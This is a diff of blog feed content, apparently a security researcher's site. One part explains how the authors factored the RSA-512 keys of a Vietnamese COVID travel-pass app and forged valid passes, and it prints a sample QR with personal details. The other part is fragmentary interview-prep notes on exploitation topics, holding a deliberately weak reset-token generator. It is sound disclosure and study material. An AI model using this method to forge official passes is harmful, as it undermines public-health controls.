+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;09:00–20:00&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;The decoded string above contains information about the requester, zone ID/passes provider (i.e. &lt;strong&gt;10505&lt;/strong&gt;). Additionally, there is a signature string at the beginning of this decoded QR - signed by RSA - SHA 256.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;2.&lt;/strong&gt; &lt;strong&gt;VALIDATION METHOD&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;It was not hard for us to find out the application on Google Play Store (now removed). However, due to countries restriction, we had to use VPN to download the application named “&lt;strong&gt;Kiểm soát đi đường&lt;/strong&gt;” a.k.a “&lt;strong&gt;Vehicle Operating Control&lt;/strong&gt;” (Translated as best as I can)&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;strong&gt;&lt;em&gt;Download link (now removed)&lt;/em&gt;&lt;/strong&gt;: &lt;a href=&quot;https://play.google.com/store/apps/details?id=com.qrca&quot;&gt;https://play.google.com/store/apps/details?id=com.qrca&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Let’s go through the application workflow:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;p&gt;The above workflow is server-less, meaning it does not need any servers during the application process. Hence, there would be an obvious pros: the system would never be overloaded. However, the huge cons here is: the application trusts its clients 100% which is not ideal.&lt;/p&gt;
+
+&lt;p&gt;Not validating the data on server side means one thing: If the Private Key from one (1) zone was leaked, anyone would be able to generate valid passes.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;3.&lt;/strong&gt; &lt;strong&gt;DEEPER DIVE INTO THE WORKFLOW&lt;/strong&gt; The original data was retrieved from the QR:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;**D9LOgcTFAS1MeC3kD4J+5PmAW5C4mOrPcbwbynsY6GEuGNkpe/dwIM5cr0MS/a+LT1y9z+8sKJA9UaPZTmYJwQ==&lt;/td&gt;
+      &lt;td&gt;**10505&lt;/td&gt;
+      &lt;td&gt;3&lt;/td&gt;
+      &lt;td&gt;06/09;07/09;08/09;09/09;10/09;11/09;12/09;13/09;14/09;15/09;16/09;17/09;18/09;19/09;20/09&lt;/td&gt;
+      &lt;td&gt;4_PHÒNG CẢNH SÁT GIAO THÔNG&lt;/td&gt;
+      &lt;td&gt;02439424451&lt;/td&gt;
+      &lt;td&gt;29G1–391.89&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;Vùng 1&lt;/td&gt;
+      &lt;td&gt;Nguyễn Ánh Ngọc&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;09:00–20:00&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;This contains: “&lt;strong&gt;10505&lt;/strong&gt;” - zone ID/passes provider, named “&lt;strong&gt;Police Department&lt;/strong&gt;”.&lt;/p&gt;
+
+&lt;p&gt;Once the application received the QR data, it would take the data string from zone ID to the end, then do the following steps:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;table&gt;
+      &lt;tbody&gt;
+        &lt;tr&gt;
+          &lt;td&gt;Removing **“&lt;/td&gt;
+          &lt;td&gt;”,**&lt;/td&gt;
+        &lt;/tr&gt;
+      &lt;/tbody&gt;
+    &lt;/table&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Removing special characters&lt;/li&gt;
+  &lt;li&gt;English Alphabetized Vietnamese chars (i.e.: ê -&amp;gt; e)&lt;/li&gt;
+  &lt;li&gt;Lowercase transformation&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/3.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Input string process&lt;/p&gt;
+
+&lt;p&gt;The data became:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;10505&lt;/strong&gt;3060907090809090910091109120913091409150916091709180919092009&lt;strong&gt;4_phongcanhsatgiaothong&lt;/strong&gt;02439424451&lt;strong&gt;29g139189&lt;/strong&gt;vung1&lt;strong&gt;nguyenanhngoc&lt;/strong&gt;09002000&lt;/p&gt;
+
+&lt;p&gt;Next, the data was hashed using a custom hashing algorithm developed by &lt;strong&gt;lachongtech.&lt;/strong&gt; The algorithm pseudocode is below:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Hashcode&lt;/strong&gt; = 0
+Count = 0
+For char in String:
+Count += 1
+&lt;strong&gt;Hashcode&lt;/strong&gt; += char * Count
+&lt;strong&gt;Hashcode&lt;/strong&gt; = (1988 * &lt;strong&gt;Hashcode&lt;/strong&gt; — 1910) / 2&lt;/p&gt;
+
+&lt;p&gt;Once the data went through above hashing process, it then became a new format: “&lt;strong&gt;682673275&lt;/strong&gt;”&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;This is the first cons in the application workflow. The fact that the above hashcode was quite easy to reproduce led to possible Collision attacks, meaning there could be other strings having the same hashcode.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/4.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The data, after getting through hashcode process, will then be validated using hard-coded Public key in the application. However, we found all hard-coded Public keys were using RSA 512. Obviously, RSA 512-bits key was proven breakable years ago.&lt;/p&gt;
+
+&lt;p&gt;After spending few hours doing research, we found an interesting research paper: &lt;strong&gt;Factoring as a Service&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/5.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Reference: &lt;a href=&quot;https://seclab.upenn.edu/projects/faas/faas.pdf&quot;&gt;https://seclab.upenn.edu/projects/faas/faas.pdf&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The authors utilized the “cloud power” to crack one (1) RSA 512-bit key within a few hours instead of using a single machine. And looks like it’s doable. Luckily, the authors also published their research as well as code repo.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Link: &lt;a href=&quot;https://github.com/eniac/faas&quot;&gt;https://github.com/eniac/faas&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Although the code was provided, we took around 2 days to get this running since the code was written back in 2015. Some libraries are not currently supported forced us to make several changes on the code. The project was then running smoothly.&lt;/p&gt;
+
+&lt;h3 id=&quot;iii-state-of-the-art&quot;&gt;III. STATE OF THE ART&lt;/h3&gt;
+
+&lt;p&gt;The most interesting thing, I believe, not about the bug, but about setting up cracking environment.&lt;/p&gt;
+
+&lt;h3 id=&quot;1-setting-up-the-environment&quot;&gt;1. Setting up the environment&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;As I mentioned above, the code was written back in 2015 by a group of Professors and Researchers from the University of Pennsylvania. A 7 years old tool, in fact, is no longer compatible with current libraries and software versions. Hence, it took time to setup and dry-run. Most of the time we spent on debugging, finding compatible libraries versions.&lt;/li&gt;
+  &lt;li&gt;The result came back great as we were able to crack a sample 100 chars length RSA.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/6.jpg&quot; alt=&quot;&quot; /&gt; Setting up EC2 instances&lt;/p&gt;
+
+&lt;h3 id=&quot;2-cracking-the-real-key&quot;&gt;2. Cracking the real key&lt;/h3&gt;
+
+&lt;p&gt;Jumping back to the application, hard-coded public keys have 155 chars in length (RSA 512-bits). This means, cracking them would need more than 1 cloud instance and super time consuming.&lt;/p&gt;
+
+&lt;p&gt;We used a total of 16 EC2 instances x 36 CPUs x 60 GiB Memory for each key. Once the script is run, the only thing we would do is waiting and hoping it will not return any FATAL errors.&lt;/p&gt;
+
+&lt;p&gt;Surprisingly, roughly 9 hours later, we were able to get the result&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/7.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;3-cost&quot;&gt;3. Cost&lt;/h3&gt;
+
+&lt;p&gt;We spent ~$250 USD to crack 2 RSA 512-bits keys in 9 hours (+ sample key - 100 chars)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/8-scaled.jpg&quot; alt=&quot;&quot; /&gt;We then tried to optimize the entire process by re-using generated sieves for other keys but unsuccessful. I also reached out to one of the authors and was told to store these sieves in a database. However, due to several reasons, we did not try further.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/9.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;4-generating-qr-code-using-found-private-key&quot;&gt;4. Generating QR code using found Private Key&lt;/h3&gt;
+
+&lt;p&gt;Once we got the key factors, we were able to calculate the original Private Key and generate several valid COVID passes.&lt;/p&gt;
+
+&lt;h3 id=&quot;iv-demo&quot;&gt;IV. DEMO&lt;/h3&gt;
+
+&lt;h3&gt;&lt;img src=&quot;images/10.png&quot; alt=&quot;&quot; /&gt;&lt;/h3&gt;
+
+&lt;p&gt;Generating QR Code&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Valid COVID pass&lt;/p&gt;</content><author><name>Chi Tran</name></author><category term="security-research" /><summary type="html">I. SUMMARY</summary></entry><entry><title type="html"></title><link href="http://localhost:4000/hackthebox/2021/09/17/544.html" rel="alternate" type="text/html" title="" /><published>2021-09-17T00:00:00-05:00</published><updated>2021-09-17T00:00:00-05:00</updated><id>http://localhost:4000/hackthebox/2021/09/17/544</id><content type="html" xml:base="http://localhost:4000/hackthebox/2021/09/17/544.html">&lt;p&gt;Given network scan results&lt;/p&gt;
+
+&lt;p&gt;{&lt;/p&gt;
+
+&lt;p&gt;‘192.168.0.1’: “80, 443, 53”.&lt;/p&gt;
+
+&lt;p&gt;‘.0.2’&lt;/p&gt;
+
+&lt;p&gt;…&lt;/p&gt;
+
+&lt;p&gt;{&lt;/p&gt;
+
+&lt;p&gt;‘80’: “.0.1, .0..2”,&lt;/p&gt;
+
+&lt;p&gt;‘443’:&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;p&gt;}&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;p&gt;security question coding problem solving breakdown demo technical dialog interview ctf walkthrough&lt;/p&gt;
+
+&lt;p&gt;be detailed be ideally web app&lt;/p&gt;
+
+&lt;p&gt;academic approach&lt;/p&gt;
+
+&lt;p&gt;Coding questions:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Solving CEASAR:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.tutorialspoint.com/cryptography_with_python/cryptography_with_python_caesar_cipher.htm&quot;&gt;https://www.tutorialspoint.com/cryptography_with_python/cryptography_with_python_caesar_cipher.htm&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Find prime:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.geeksforgeeks.org/python-program-to-check-whether-a-number-is-prime-or-not/&quot;&gt;https://www.geeksforgeeks.org/python-program-to-check-whether-a-number-is-prime-or-not/&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Power of 2:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.ixiacom.com/company/blog/exploiting-php-phar-deserialization-vulnerabilities-part-1&quot;&gt;https://www.ixiacom.com/company/blog/exploiting-php-phar-deserialization-vulnerabilities-part-1&lt;/a&gt; &lt;a href=&quot;https://www.geeksforgeeks.org/python-program-to-find-whether-a-no-is-power-of-two/&quot;&gt;https://www.geeksforgeeks.org/python-program-to-find-whether-a-no-is-power-of-two/&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Python pickle:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://intoli.com/blog/dangerous-pickles/&quot;&gt;https://intoli.com/blog/dangerous-pickles/&lt;/a&gt; &lt;a href=&quot;https://blog.nelhage.com/2011/03/exploiting-pickle/&quot;&gt;https://blog.nelhage.com/2011/03/exploiting-pickle/&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;PHP dese:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.ixiacom.com/company/blog/exploiting-php-phar-deserialization-vulnerabilities-part-2&quot;&gt;https://www.ixiacom.com/company/blog/exploiting-php-phar-deserialization-vulnerabilities-part-2&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Java deser:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://medium.com/swlh/hacking-java-deserialization-7625c8450334&quot;&gt;https://medium.com/swlh/hacking-java-deserialization-7625c8450334&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Apache log parser&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;import re&lt;/p&gt;
+
+&lt;p&gt;HOST = r’^(?P&lt;host&gt;._?)&apos;_ _SPACE = r&apos;\\s&apos;_ _IDENTITY = r&apos;\\S+&apos;_ _USER = r&apos;\\S+&apos;_ _TIME = r&apos;(?P&lt;time&gt;\\\[._?\\\])&apos; REQUEST = r&apos;\\&quot;(?P&lt;request&gt;.\*?)\\&quot;&apos; STATUS = r&apos;(?P&lt;status&gt;\\d{3})&apos; SIZE = r&apos;(?P&lt;size&gt;\\S+)&apos;&lt;/size&gt;&lt;/status&gt;&lt;/request&gt;&lt;/time&gt;&lt;/host&gt;&lt;/p&gt;
+
+&lt;p&gt;REGEX = HOST+SPACE+IDENTITY+SPACE+USER+SPACE+TIME+SPACE+REQUEST+SPACE+STATUS+SPACE+SIZE+SPACE&lt;/p&gt;
+
+&lt;p&gt;def parser(log_line): match = re.search(REGEX,log_line) return ( (match.group(‘host’), match.group(‘time’), match.group(‘request’) , match.group(‘status’) , match.group(‘size’) ) )&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Buffer overflow&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.geeksforgeeks.org/heap-overflow-stack-overflow/&quot;&gt;https://www.geeksforgeeks.org/heap-overflow-stack-overflow/&lt;/a&gt; &lt;a href=&quot;https://www.geeksforgeeks.org/stack-vs-heap-memory-allocation/&quot;&gt;https://www.geeksforgeeks.org/stack-vs-heap-memory-allocation/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Global, Heap, and Stack Overflows in C
+In the following example, the global_array, heap_buffer, and stack_buffer variables each have valid indexes in the range [0, 9], but the accessed index is 10, which causes an overflow:&lt;/p&gt;
+
+&lt;p&gt;int global_array[10] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9};
+void foo() {
+    int idx = 10;
+    global_array[idx] = 42; // Error: out of bounds access of global variable
+    char *heap_buffer = malloc(10);
+    heap_buffer[idx] = ‘x’; // Error: out of bounds access of heap allocated variable
+    char stack_buffer[10];
+    stack_buffer[idx] = ‘x’; // Error: out of bounds access of stack allocated variable
+}&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Format string&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://owasp.org/www-community/attacks/Format_string_attack&quot;&gt;https://owasp.org/www-community/attacks/Format_string_attack&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;CIDR to IP&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; import ipaddress
+&amp;gt;&amp;gt;&amp;gt; net=ipaddress.ip_network(&apos;94.192.0.0/14&apos;)
+IPv4Network(&apos;94.192.0.0/14&apos;)
+&amp;gt;&amp;gt;&amp;gt; &apos;%s-%s&apos; % (net[0], net[-1])
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;IP count in log:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://medium.com/devops-challenge/apache-log-parser-using-python-8080fbc41dda&quot;&gt;https://medium.com/devops-challenge/apache-log-parser-using-python-8080fbc41dda&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;PCAP log parser&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://stackoverflow.com/questions/46996649/how-do-i-parse-a-tcpdump-file-with-python&quot;&gt;https://stackoverflow.com/questions/46996649/how-do-i-parse-a-tcpdump-file-with-python&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;PORT Scan:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.peerlyst.com/posts/python-3-tcp-ip-scanner-outputs-open-ports-guy-derenoncourt&quot;&gt;https://www.peerlyst.com/posts/python-3-tcp-ip-scanner-outputs-open-ports-guy-derenoncourt&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Nmap Parser:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://xael.org/pages/python-nmap-en.html&quot;&gt;https://xael.org/pages/python-nmap-en.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;PDFs parser:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://realpython.com/pdf-python/#how-to-extract-document-information-from-a-pdf-in-python&quot;&gt;https://realpython.com/pdf-python/#how-to-extract-document-information-from-a-pdf-in-python&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Packet parser:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://stackoverflow.com/questions/20556139/how-do-i-parse-a-captured-packet-in-python&quot;&gt;https://stackoverflow.com/questions/20556139/how-do-i-parse-a-captured-packet-in-python&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Technical&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Secure Image:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://security.stackexchange.com/questions/222760/how-do-we-secure-image-parsing-libraries-against-buffer-overflow&quot;&gt;https://security.stackexchange.com/questions/222760/how-do-we-secure-image-parsing-libraries-against-buffer-overflow&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Same-origin_policy&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.netsparker.com/whitepaper-same-origin-policy/&quot;&gt;https://www.netsparker.com/whitepaper-same-origin-policy/&lt;/a&gt; &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy&quot;&gt;https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;CORS vs CSP&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://devonblog.com/security/difference-between-cors-and-csp-security-headers/&quot;&gt;https://devonblog.com/security/difference-between-cors-and-csp-security-headers/&lt;/a&gt; &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy&quot;&gt;https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Traceroute&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.slashroot.in/how-does-traceroute-work-and-examples-using-traceroute-command&quot;&gt;https://www.slashroot.in/how-does-traceroute-work-and-examples-using-traceroute-command&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Google SSO&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.quora.com/How-does-Google-single-sign-on-work&quot;&gt;https://www.quora.com/How-does-Google-single-sign-on-work&lt;/a&gt; &lt;a href=&quot;https://www.quora.com/How-does-Google-achieve-single-sign-on-between-different-domains-such-as-YouTube-and-Gmail&quot;&gt;https://www.quora.com/How-does-Google-achieve-single-sign-on-between-different-domains-such-as-YouTube-and-Gmail&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;XSS Auditor deprecated&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://portswigger.net/daily-swig/google-deprecates-xss-auditor-for-chrome&quot;&gt;https://portswigger.net/daily-swig/google-deprecates-xss-auditor-for-chrome&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;SSRF&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://unit42.paloaltonetworks.com/server-side-request-forgery-exposes-data-of-technology-industrial-and-media-organizations/&quot;&gt;https://unit42.paloaltonetworks.com/server-side-request-forgery-exposes-data-of-technology-industrial-and-media-organizations/&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;SSRF Testing payload&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/cujanovic/SSRF-Testing&quot;&gt;https://github.com/cujanovic/SSRF-Testing&lt;/a&gt; fnsakfnsalkgnaslkg&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;XSS Prevention&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;alphanumeric http header &lt;a href=&quot;https://www.acunetix.com/websitesecurity/xss/&quot;&gt;https://www.acunetix.com/websitesecurity/xss/&lt;/a&gt; &lt;a href=&quot;https://security.stackexchange.com/questions/86561/is-csp-enough-to-prevent-xss-attacks&quot;&gt;https://security.stackexchange.com/questions/86561/is-csp-enough-to-prevent-xss-attacks&lt;/a&gt; &lt;a href=&quot;https://security.stackexchange.com/questions/19524/current-best-practices-to-prevent-persistent-xss-attacks&quot;&gt;https://security.stackexchange.com/questions/19524/current-best-practices-to-prevent-persistent-xss-attacks&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;-CSRF &lt;a href=&quot;https://www.acunetix.com/websitesecurity/csrf-attacks/&quot;&gt;https://www.acunetix.com/websitesecurity/csrf-attacks/&lt;/a&gt; &lt;a href=&quot;https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.md&quot;&gt;https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.md&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;XXE&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.acunetix.com/blog/articles/xml-external-entity-xxe-vulnerabilities/&quot;&gt;https://www.acunetix.com/blog/articles/xml-external-entity-xxe-vulnerabilities/&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;SQLi:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://portswigger.net/web-security/sql-injection&quot;&gt;https://portswigger.net/web-security/sql-injection&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Access Control&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://portswigger.net/web-security/access-control&quot;&gt;https://portswigger.net/web-security/access-control&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Please use this Google doc during your interview (your interviewer will see what you write here). To free your hands for typing, we recommend using a headset or speakerphone.&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;asdf&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Int global_array[10] = {0,1,2,3,4,5,6,7,8,9}&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Void foo_bar():&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Int index = 10;&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Char stack_overflow[10];&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Stack_overflow[index] = ‘x’;&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;//error out of bound access to the stack allocated&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;import time&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;import ctypes&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;import os&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;import md5&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;# Use the underlying C library rand/srand functions.&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;if os.name == &apos;nt&apos;:&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc = ctypes.CDLL(&apos;msvcrt.dll&apos;)&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;else:&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc = ctypes.CDLL(&apos;libc.so.6&apos;)&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rand = libc.rand&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;srand = libc.srand&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;srand.restype = None&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;# Seed generation.&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;def make_seed():&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tm = time.time() # 1501662529.576924 (microsecond precision)&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sec = int(tm) # 1501662529 #&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sec_fraction = tm % 1.0 # 0.575924&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;seed = sec + sec_fraction * 100000&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;return int(seed) #2m&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;# Password reset token generation.&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;def generate_token(username):&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;srand(make_seed())&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;return md5.md5(str(rand()) + username).hexdigest() #MD5 string 32 char alphanumeric&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;# rand() --&amp;gt; [0, 2**31-1]&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;# Example usage.&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;# print generate_token(&quot;john&quot;)&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0e4125341253154243&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;00 === 0&lt;/code&gt;&lt;/p&gt;
+
